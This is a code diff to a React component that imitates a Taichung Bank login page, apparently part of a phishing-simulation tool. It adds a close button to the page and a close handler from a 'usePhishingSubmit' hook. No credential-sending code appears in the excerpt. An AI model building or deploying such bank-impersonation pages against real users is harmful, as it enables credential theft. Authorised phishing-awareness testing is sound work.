@@ -1,12 +1,14 @@
 "use client";
 
 import { usePhishingSubmit } from "./usePhishingSubmit";
+import { PhishingCloseButton } from "./PhishingCloseButton";
 
 export default function TaichungBankLogin({ token }: { token: string }) {
-  const { loading, handleSubmit } = usePhishingSubmit(token);
+  const { loading, handleSubmit, handleClose } = usePhishingSubmit(token);
 
   return (
     <div className="min-h-screen bg-[#f5f5f5]">
+      <PhishingCloseButton onClose={handleClose} />
       {/* Top bar */}
       <div className="bg-[#c8102e] text-white">
         <div className="max-w-[1200px] mx-auto px-4 py-2 flex items-center justify-between">
